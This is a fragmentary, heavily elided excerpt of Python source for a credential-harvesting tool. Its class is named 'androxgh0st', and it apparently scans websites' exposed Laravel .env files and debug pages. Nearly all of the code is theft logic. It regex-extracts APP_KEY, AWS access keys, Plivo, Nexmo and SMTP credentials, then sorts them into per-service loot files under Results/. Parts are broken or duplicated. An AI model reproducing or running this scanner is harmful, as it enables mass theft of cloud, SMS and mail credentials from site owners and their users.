...
class androxgh0st:
	def paypal(self, text, url):
		if "APP_KEY" in text:
			save = open('Results/APPKEY.txt','a')
			save.write(url+'\n')
			save.close()
			return True
		else:
		...
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				...
				if aws_key == "" and aws_sec == "":
					...
					build = str(aws_key)+'|'+str(aws_sec)+'|'+str('us-east-2')
				...
				if aws_key == "" and aws_sec == "":
					...
					build = tr(aws_key)+'|'+str(aws_sec)+'|'+str('us-east-2')
					remover = str(build).replace('\r', '')
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
			...
			if "PLIVO" in text:
				if "PLIVO" in text:
					...
					try:
						...
						plivo_auth_id = ''
					try:
						plivo_auth_token = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						plivo_auth_token = ''
				elif '<td>PLIVO</td>' in text:
					method = 'debug'
					try:
						plivo_auth_id = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth_id = ''
					try:
						plivo_auth_token = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?<\/span>', text)[0]
					except:
						plivo_auth_token = ''
					build = (plivo_auth_id)+'|'+str(plivo_auth_token)
					remover = str(build).replace('\r', '')
			...
			if "NEXMO" in text:
				if "NEXMO" in text:
					...
					try:
						...
						nexmo_secret = ''
					try:
						nexmo_from = reg('<td>NEXMO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_from = ''
				build = (nexmo_key)+'|'+str(nexmo_secret)
				remover = str(build).replace('\r', '')
			...
			if "MAIL_HOST" in text:
				...
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					...
					if '.amazonaws.com' in mailhost:
						...
						build = (mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)+'|'+str(mailfrom)
						remover = str(build).replace('\r', '')
					...
					if '.amazonaws.com' in mailhost:
						...
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/smtp_aws_url.txt', 'a')
						save2.write(remover+'\n\n')
						save2.close()
					elif 'apikey' in mailuser:
						build = (mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/sendgrid_apikey.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gmail' in mailuser:
						build = (mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						...
						build = (mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/AWS_APPS.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'smtpout' in mailhost:
						build = (mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/smtpout.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gmail' in mailhost:
						build = (mailhost)+'|'+str(mailport)+'|'+str(mailuser)+'|'+str(mailpass)
						remover = str(build).replace('\r', '')
						save = open('Results/gsuite.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
...
def main(url):
	...
	try:
		...
		if resp:
			...
			getplivo = androxgh0st().get_plivo(resp, url)
			if getsmtp:
			...
			if getpp:
				text += ' | \033[32;1mAPPKEY\033[0m'
			else:
				text += ' | \033[31;1mAPPKEY\033[0m'
			if getnexmo:
